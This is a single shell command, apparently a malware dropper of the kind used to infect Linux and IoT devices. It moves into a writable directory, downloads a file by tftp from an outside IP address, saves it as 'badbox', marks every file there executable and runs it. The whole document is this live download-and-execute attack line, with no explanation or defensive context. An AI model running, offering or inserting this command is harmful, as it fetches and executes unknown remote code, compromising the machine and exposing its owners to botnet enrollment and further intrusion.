cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r bash -g 192.227.180.164;cat bash >badbox;chmod +x *;./badbox
